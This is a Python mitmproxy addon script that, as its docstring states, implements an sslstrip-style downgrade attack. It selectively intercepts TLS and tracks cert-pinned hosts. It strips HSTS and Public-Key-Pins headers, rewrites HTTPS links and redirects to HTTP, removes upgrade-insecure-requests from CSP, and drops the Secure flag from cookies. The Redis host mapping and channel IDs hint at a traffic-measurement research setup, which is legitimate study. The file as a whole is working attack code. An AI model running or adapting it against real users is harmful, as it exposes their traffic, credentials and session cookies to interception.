"""
Based on https://github.com/mitmproxy/mitmproxy/blob/master/examples/complex/sslstrip.py
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""

import collections
import redis
import time
import re
import os
import urllib.parse
import typing  # noqa
import mitmproxy
import logging
import traceback
from os.path import isfile, join
from datetime import datetime
import threading

from enum import Enum
from mitmproxy import ctx
from mitmproxy.exceptions import TlsProtocolException
from mitmproxy.proxy.protocol import TlsLayer, RawTCPLayer
from mitmproxy import http
from tld import get_fld


USE_DOMAINS_FOR_SSL_WHITELISTING = True

try:
    UNMITMABLE_HOST_DIR = os.environ['UNMITMABLE_HOST_DIR']
except Exception as e:
    print("Error! Env variable UNMITMABLE_HOST_DIR not defined!")


class InterceptionResult(Enum):
    success = True
    failure = False
    skipped = None


def append_to_file(file_path, text):
    with open(file_path, 'a') as f:
        f.write(text)


def loadUnMitmableHostsAndIps(filename):
    hosts = set()
    ips = set()
    domains = set()
    if isfile(filename):
        for line in open(filename):
            append_to_file(unMitmableFileNameOut, line)
            line = line.rstrip("\n")
            _, ip, host, domain = line.split("\t")
            if host:
                hosts.add(host)
            if ip:
                ips.add(ip)
            if domain:
                domains.add(domain)
    return hosts, ips, domains

def get_domain(hostname):
    hostname = hostname.rstrip(".")
    if not hostname.startswith("http"):
        hostname = "http://" + hostname
    return get_fld(hostname, fail_silently=True)



class _TlsStrategy:
    """
    Abstract base class for interception strategies.
    """

    def __init__(self, unMitmableFileNameIn):
        # A server_address -> interception results mapping
        self.rName2IPDic = redis.StrictRedis(host='localhost', port=6379, db=0, charset="utf-8", decode_responses=True)
        self.rIP2NameDic = redis.StrictRedis(host='localhost', port=6379, db=1, charset="utf-8", decode_responses=True)
        # TODO: rename to unMitmableHosts -> unMitmableDomains...
        self.unMitmableHosts, self.unMitmableIps, self.unMitmableDomains = \
            loadUnMitmableHostsAndIps(unMitmableFileNameIn)

        my_log("Loaded %d unmitmable domains, %d unmitmable hosts, %d "
               "unmitmable IPs from %s" % (
            len(self.unMitmableDomains), len(self.unMitmableHosts),
            len(self.unMitmableIps), unMitmableFileNameIn),
               write_to_file=False)

        self.mitmableHosts = set()
        self.mitmableIps = set()
        self.mitmableDomains = set()

    def getAssocitatedIPs(self, IPAddress):
        IPList = set([str(IPAddress)])
        hostname = self.rIP2NameDic.get(IPAddress)
        if hostname and hostname in self.rName2IPDic:
            IPList = IPList.union(self.rName2IPDic.smembers(hostname))
        return list(IPList)

    def getAssociatedDomain(self, IPAddress):
        hostname = ""
        effective_tld = ""
        if IPAddress in self.rIP2NameDic:
            hostname = self.rIP2NameDic.get(IPAddress)
            if hostname and USE_DOMAINS_FOR_SSL_WHITELISTING:
                effective_tld = get_domain(hostname)
                if effective_tld:
                    print("Hostname %s mapped to effective tld %s" % (hostname, effective_tld))
        return hostname, effective_tld


    def should_intercept(self, server_address):
        """
        Returns:
            True, if we should attempt to intercept the connection.
            False, if we want to employ pass-through instead.
        """
        raise NotImplementedError()

    def record_success(self, server_address):
        ip = server_address[0]
        hostname, effective_tld = self.getAssociatedDomain(ip)
        self.mitmableIps.add(ip)
        if hostname:
            self.mitmableHosts.add(hostname)
        if effective_tld:
            self.mitmableDomains.add(effective_tld)
        append_to_file(
            mitmableFileName,
            "%s\t%s\t%s\t%s\n" % (str(channel_id), ip, hostname, effective_tld))

    def record_failure(self, server_address):
        ip = server_address[0]
        hostname, effective_tld = self.getAssociatedDomain(ip)
        self.unMitmableIps.add(ip)
        if hostname:
            self.unMitmableHosts.add(hostname)
        if effective_tld:
            self.unMitmableDomains.add(effective_tld)

        MITM_LEARNED_NEW_ENDPOINT = "/tmp/MITM_LEARNED_NEW_ENDPOINT"
        if not isfile(MITM_LEARNED_NEW_ENDPOINT):
            try:
                print("New UnMITM endpoint detected. Touching %s file." % MITM_LEARNED_NEW_ENDPOINT)
                open(MITM_LEARNED_NEW_ENDPOINT, 'a').close()
            except Exception:
                print("Cannot create the MITM_LEARNED_NEW_ENDPOINT file")
        append_to_file(
            unMitmableFileNameOut,
            "%s\t%s\t%s\t%s\n" % (str(channel_id), ip, hostname, effective_tld))


class ConservativeStrategy(_TlsStrategy):
    """
    Conservative Interception Strategy - only intercept if there haven't been any failed attempts
    in the history.
    """

    def should_intercept(self, server_address):
        ip = server_address[0]
        hostname, effective_tld = self.getAssociatedDomain(ip)

        #TLD level
        if effective_tld and effective_tld in self.unMitmableDomains:
            print("Effective TLD %s already whitelisted!" % effective_tld)
            return False

        #Hostname level
        if hostname and hostname in self.unMitmableHosts:
            print("Hostname %s already whitelisted!" % hostname)
            return False

        #IP level
        if ip and ip in self.unMitmableIps:
            print("IP %s already whitelisted!" % ip)
            return False

        print("Server not in any whitelist! Intercepting %s:(%s:%s)"
              % (str(server_address), hostname, effective_tld))
        return True



class TlsFeedback(TlsLayer):
    """
    Monkey-patch _establish_tls_with_client to get feedback if TLS could be established
    successfully on the client connection (which may fail due to cert pinning).
    """
    def _establish_tls_with_client(self):
        server_address = self.server_conn.address

        try:
            super(TlsFeedback, self)._establish_tls_with_client()
        except TlsProtocolException as e:
            tls_strategy.record_failure(server_address)
            raise e
        else:
            tls_strategy.record_success(server_address)


# inline script hooks below.

tls_strategy = None


def load(l):
    l.add_option(
        "tlsstrat", int, 0, "TLS passthrough strategy (0-100)",
    )
    l.add_option(
        "channel_id", str, "", "Channel ID",
    )
    l.add_option(
        "data_dir", str, "", "/tmp/",
    )
    # 0 for False and other values for True
    l.add_option(
        "ssl_strip", int, 1, "Enable SSL Strip option: 0 for False and other values for True",
    )
    l.add_option(
        "tls_intercept", int, 1, "Enable TLS intercept option: 0 for False and other values for True",
    )
    '''
    try:
        os.remove(mitmableFileName)
        os.remove(unMitmableFileName)
    except Exception:
        pass
    '''

def my_log(*args, write_to_file = True):
    global strip_log_file, lock_obj
    s = '[{}] '.format(datetime.today())
    s += ' '.join([str(v) for v in args])

    print(s)
    if write_to_file:
        with lock_obj:
            with open(strip_log_file, 'a') as fp:
                print(s, file=fp)

def configure(updated):
    global tls_strategy, channel_id, data_dir, mitmableFileName, unMitmableFileNameIn, unMitmableFileNameOut,\
        strip_log_file, lock_obj, ssl_strip_en, tls_intercept_en
    #if ctx.options.tlsstrat > 0:
    #    tls_strategy = ProbabilisticStrategy(float(ctx.options.tlsstrat) / 100.0)
    #else:
    #    tls_strategy = ConservativeStrategy()
    try:
        mitmproxy.ctx.log('Loading smart tls script!')
        lock_obj = threading.Lock()
        channel_id = ctx.options.channel_id
        data_dir = ctx.options.data_dir
        ssl_strip_en = bool(ctx.options.ssl_strip)
        tls_intercept_en = bool(ctx.options.tls_intercept)

        #base_filename = '{}-{}'.format(
        #    channel_id,
        #    int(time.time())
        #)

        strip_log_dir = os.path.join(str(data_dir), "mitmlog/")
        if not os.path.isdir(strip_log_dir):
            mitmproxy.ctx.log("Error!!! Strip folder %s not found!" % strip_log_dir)
        else:
            strip_log_file = os.path.join(strip_log_dir, (str(channel_id) + '.strip'))

        mitmableFileName = os.path.join(str(data_dir), "mitmlog/") + str(channel_id) + '.mitmable'
        unMitmableFileNameIn = join(UNMITMABLE_HOST_DIR, str(channel_id) + '.unmitmable')
        unMitmableFileNameOut = os.path.join(str(data_dir), "mitmlog/") + str(channel_id) + '.unmitmable'
        # unMitmableFileName = str(data_dir) + "/mitmlog/" + str(channel_id) + '.unmitmable'
        tls_strategy = ConservativeStrategy(unMitmableFileNameIn)

        mitmproxy.ctx.log('Successfully loaded smart tls script!')
        mitmproxy.ctx.log('SSL strip set to %s' % str(ssl_strip_en))
        mitmproxy.ctx.log('TLS intercept set to %s' % str(tls_intercept_en))
        #os.environ['SSLKEYLOGFILE'] = "~/.mitmproxy/sslkeylogfile.txt"
    except Exception as e:
        mitmproxy.ctx.log('Error loading the smart tls script!')
        traceback.print_exc()


def next_layer(next_layer):
    """
    This hook does the actual magic - if the next layer is planned to be a TLS layer,
    we check if we want to enter pass-through mode instead.
    """
    if isinstance(next_layer, TlsLayer) and next_layer._client_tls:
        server_address = next_layer.server_conn.address

        global tls_intercept_en
        if not tls_intercept_en:
            timestamp = '[{}] '.format(datetime.today())
            mitmproxy.ctx.log(
                timestamp + "TLS intercept is disabled! Skipping TLS interception for %s " % str(server_address))
            next_layer_replacement = RawTCPLayer(next_layer.ctx, ignore=True)
            next_layer.reply.send(next_layer_replacement)
            # tls_strategy.record_skipped(server_address)
            return

        #cert = next_layer._find_cert())
        hostname, _ = tls_strategy.getAssociatedDomain(server_address[0])

        timestamp = '[{}] '.format(datetime.today())
        if hostname:
            mitmproxy.ctx.log(timestamp + "Deciding TLS strategy for %s mapped to %s " % (str(server_address), hostname))
        else:
            mitmproxy.ctx.log(timestamp + "Deciding TLS strategy for %s " % str(server_address))

        if not tls_strategy:
             mitmproxy.ctx.log("tls_strategy is None for %s" % repr(next_layer.server_conn.address), "info")
             return

        if tls_strategy.should_intercept(server_address):
            # We try to intercept.
            # Monkey-Patch the layer to get feedback from the TLSLayer if interception worked.
            next_layer.__class__ = TlsFeedback
        else:
            # We don't intercept - reply with a pass-through layer and add a "skipped" entry.
            timestamp = '[{}] '.format(datetime.today())
            if hostname:
                mitmproxy.ctx.log(timestamp + "TLS passthrough for %s mapped to %s" % (repr(next_layer.server_conn.address), hostname), "info")
            else:
                mitmproxy.ctx.log(timestamp + "TLS passthrough for %s" % repr(next_layer.server_conn.address), "info")
            next_layer_replacement = RawTCPLayer(next_layer.ctx, ignore=True)
            next_layer.reply.send(next_layer_replacement)
            # tls_strategy.record_skipped(server_address)


# set of SSL/TLS capable hosts
secure_hosts: typing.Set[str] = set()


def request(flow: http.HTTPFlow) -> None:
    global ssl_strip_en
    if not ssl_strip_en:
        return
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)
    #mitmproxy.ctx.log(
    #    "Request: %s" % repr(flow.request),
    #    "debug")

    # do not force https redirection
    if flow.request.headers.pop('Upgrade-Insecure-Requests', None):
        my_log(
            "SSLStrip - Removing header Upgrade-Insecure-Requests for %s" % flow.request.url)

    # proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host


def response(flow: http.HTTPFlow) -> None:
    global ssl_strip_en
    if not ssl_strip_en:
        return
    #flow.response.headers.pop('Strict-Transport-Security', None)
    #flow.response.headers.pop('Public-Key-Pins', None)
    #mitmproxy.ctx.log(
    #    "Response: %s" % repr(flow.response.content),
    #    "debug")
    request_url = flow.request.url
    if flow.response.headers.pop('Strict-Transport-Security', None):
        my_log(
            "SSLStrip - Removing header Strict-Transport-Security for %s" %
            request_url)
    if flow.response.headers.pop('Public-Key-Pins', None):
        my_log(
            "SSLStrip - Removing header Public-Key-Pins for %s:%s" % (request_url, repr(flow.response.port)))


    # strip links in response body
    if b'https://' in flow.response.content:
        try:
            # extract HTTPS URLs from the response body
            https_urls = re.findall('https://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', repr(flow.response.content))
            for https_url in https_urls:
                if "." not in https_url:  # exclude URLs like https://ssl
                    continue
                my_log(
                    "SSLStrip - Will downgrade to HTTP %s %s" %
                    (https_url, request_url))
        except Exception:
            my_log(
                "Error while extracting HTTPS links %s" % request_url)

    flow.response.content = flow.response.content.replace(b'https://', b'http://')

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    # strip links in 'Location' header
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
            my_log(
            "Secure Host added: %s" % hostname)
        my_log("SSLStrip - Will downgrade Location header to HTTP %s %s" % (location, request_url))
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)


    # strip upgrade-insecure-requests in Content-Security-Policy header
    if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
        my_log(
            "SSLStrip - upgrade-insecure-requests: %s %s" %
            (repr(flow.response.headers.get('Content-Security-Policy', '')),
             request_url))
        csp = flow.response.headers['Content-Security-Policy']
        flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        mitmproxy.ctx.log("Removing upgrade-insecure-requests for %s:%s" % (repr(flow.response.host),repr(flow.response.port)), "warn")

    # strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all('Set-Cookie')
    if cookies:
        for s in cookies:
            if "secure" in s:
                my_log("SSLStrip - Stripping Secure Cookie: %s %s" %
                             (repr(s), request_url))
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)
